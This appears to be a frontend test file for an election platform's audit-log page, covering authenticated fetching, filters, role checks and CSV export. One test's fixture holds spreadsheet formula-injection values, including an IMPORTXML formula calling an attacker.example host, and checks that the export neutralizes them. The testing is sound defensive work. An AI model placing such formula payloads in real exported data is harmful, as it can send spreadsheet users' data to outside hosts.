import React from 'react';
import { fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import { http, HttpResponse } from 'msw';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { ThemeProvider } from '@mirems/ui-core';
import { AuthContext, type AuthContextValue } from '../../auth/AuthProvider';
import { server } from '../../test/msw-server';
import { AuditLogPage } from './audit-log-page';

const auditEvents = [
  {
    id: '90000000-0000-0000-0000-000000000001',
    eventType: 'VOTE_CAST',
    aggregateId: '10000000-0000-0000-0000-000000000001',
    aggregateType: 'VOTING_SESSION',
    actorId: 'auditor-kim',
    occurredAt: '2026-05-16T01:00:00Z',
    sourceIp: '203.0.113.10',
    payload: { electionId: 'election-2026', resultHash: 'hash-001' },
  },
  {
    id: '90000000-0000-0000-0000-000000000002',
    eventType: 'TABULATION_COMPLETED',
    aggregateId: '20000000-0000-0000-0000-000000000002',
    aggregateType: 'TABULATION_REPORT',
    actorId: 'system-admin-lee',
    occurredAt: '2026-05-17T02:30:00Z',
    sourceIp: '198.51.100.20',
    payload: { electionId: 'election-2026', totalBallots: 200 },
  },
];

const authBase: AuthContextValue = {
  user: { access_token: 'test-access-token', expired: false, profile: {} } as AuthContextValue['user'],
  roles: ['AUDITOR'],
  electionScope: [],
  isAuthenticated: true,
  isLoading: false,
  login: async () => undefined,
  logout: async () => undefined,
  hasRole: (role) => role === 'AUDITOR',
  hasElectionScope: () => false,
};

function renderWithAuth(ui: React.ReactElement, auth: AuthContextValue = authBase) {
  return render(
    <ThemeProvider>
      <AuthContext.Provider value={auth}>{ui}</AuthContext.Provider>
    </ThemeProvider>,
  );
}

function expectBearerAuth(request: Request) {
  expect(request.headers.get('authorization')).toBe('Bearer test-access-token');
}

function readBlobText(blob: Blob): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onerror = () => reject(reader.error);
    reader.onload = () => resolve(String(reader.result));
    reader.readAsText(blob);
  });
}

beforeEach(() => {
  Object.defineProperty(URL, 'createObjectURL', { configurable: true, value: vi.fn(() => 'blob:audit-csv') });
  Object.defineProperty(URL, 'revokeObjectURL', { configurable: true, value: vi.fn() });
});

afterEach(() => {
  vi.restoreAllMocks();
});

describe('AuditLogPage', () => {
  it('loads searchable audit events with Authorization and renders append-only audit table', async () => {
    server.use(
      http.get('/miremsplatform/audit', ({ request }) => {
        expectBearerAuth(request);
        const url = new URL(request.url);
        expect(url.searchParams.get('page')).toBe('0');
        expect(url.searchParams.get('size')).toBe('20');
        return HttpResponse.json({ content: auditEvents, page: 0, size: 20, totalElements: 2, totalPages: 1 });
      }),
    );

    renderWithAuth(<AuditLogPage />);

    const row = await screen.findByRole('row', { name: /VOTE_CAST/ });
    expect(within(row).getByText('VOTING_SESSION')).toBeInTheDocument();
    expect(within(row).getByText('auditor-kim')).toBeInTheDocument();
    expect(screen.getByText('총 2건')).toBeInTheDocument();

    fireEvent.change(screen.getByLabelText('검색어'), { target: { value: 'tabulation' } });
    expect(await screen.findByRole('row', { name: /TABULATION_COMPLETED/ })).toBeInTheDocument();
    expect(screen.queryByRole('row', { name: /VOTE_CAST/ })).not.toBeInTheDocument();
  });

  it('submits aggregate type, date range, and actor filters', async () => {
    let filteredRequestSeen = false;
    const requestUrls: string[] = [];
    server.use(
      http.get('/miremsplatform/audit', ({ request }) => {
        expectBearerAuth(request);
        const url = new URL(request.url);
        requestUrls.push(url.toString());
        if (url.searchParams.get('aggregateType') === 'TABULATION_REPORT') {
          filteredRequestSeen = true;
          expect(url.searchParams.get('from')).toBe('2026-05-17T00:00:00.000Z');
          expect(url.searchParams.get('to')).toBe('2026-05-18T23:59:59.999Z');
        }
        return HttpResponse.json({ content: auditEvents, page: 0, size: 20, totalElements: 2, totalPages: 1 });
      }),
    );

    renderWithAuth(<AuditLogPage />);

    fireEvent.change(screen.getByLabelText('집계 유형'), { target: { value: 'TABULATION_REPORT' } });
    fireEvent.change(screen.getByLabelText('시작일'), { target: { value: '2026-05-17' } });
    fireEvent.change(screen.getByLabelText('종료일'), { target: { value: '2026-05-18' } });
    fireEvent.change(screen.getByLabelText('행위자'), { target: { value: 'system-admin' } });
    fireEvent.click(screen.getByRole('button', { name: '필터 적용' }));

    const row = await screen.findByRole('row', { name: /TABULATION_COMPLETED/ });
    await waitFor(() => expect(filteredRequestSeen).toBe(true));
    await new Promise((resolve) => setTimeout(resolve, 50));
    expect(requestUrls.at(-1)).toContain('aggregateType=TABULATION_REPORT');
    expect(within(row).getByText('system-admin-lee')).toBeInTheDocument();
    expect(screen.queryByRole('row', { name: /VOTE_CAST/ })).not.toBeInTheDocument();
  });

  it('exports the currently filtered audit events to CSV and neutralizes spreadsheet formulas', async () => {
    const formulaEvent = {
      ...auditEvents[0],
      id: '90000000-0000-0000-0000-000000000003',
      eventType: '=IMPORTXML("https://attacker.example")',
      actorId: '+malicious-actor',
      sourceIp: '@cmd',
      payload: { note: '@cmd' },
    };
    server.use(
      http.get('/miremsplatform/audit', ({ request }) => {
        expectBearerAuth(request);
        return HttpResponse.json({ content: [formulaEvent], page: 0, size: 20, totalElements: 1, totalPages: 1 });
      }),
    );
    const clickSpy = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => undefined);

    renderWithAuth(<AuditLogPage />);

    expect(await screen.findByText('=IMPORTXML("https://attacker.example")')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: 'CSV 내보내기' }));

    const createObjectURLMock = vi.mocked(URL.createObjectURL);
    expect(createObjectURLMock).toHaveBeenCalledWith(expect.any(Blob));
    const blob = createObjectURLMock.mock.calls.at(0)?.at(0) as Blob;
    const csv = await readBlobText(blob);
    expect(csv).toContain("'=IMPORTXML");
    expect(csv).toContain("'+malicious-actor");
    expect(csv).toContain("'@cmd");
    expect(clickSpy).toHaveBeenCalledOnce();
    expect(screen.getByText('CSV 파일이 준비되었습니다.')).toBeInTheDocument();
    clickSpy.mockRestore();
  });

  it('allows SYSTEM_ADMIN and blocks other roles before audit API calls', async () => {
    let apiCalls = 0;
    server.use(
      http.get('/miremsplatform/audit', () => {
        apiCalls += 1;
        return HttpResponse.json({ content: auditEvents, page: 0, size: 20, totalElements: 2, totalPages: 1 });
      }),
    );

    renderWithAuth(<AuditLogPage />, {
      ...authBase,
      roles: ['SYSTEM_ADMIN'],
      hasRole: (role) => role === 'SYSTEM_ADMIN',
    });
    expect(await screen.findByText('VOTE_CAST')).toBeInTheDocument();

    renderWithAuth(<AuditLogPage />, {
      ...authBase,
      roles: ['VOTER'],
      hasRole: () => false,
    });
    expect(screen.getByText('감사 로그는 AUDITOR 또는 SYSTEM_ADMIN 권한이 필요합니다.')).toBeInTheDocument();

    await waitFor(() => expect(apiCalls).toBe(1));
  });
});
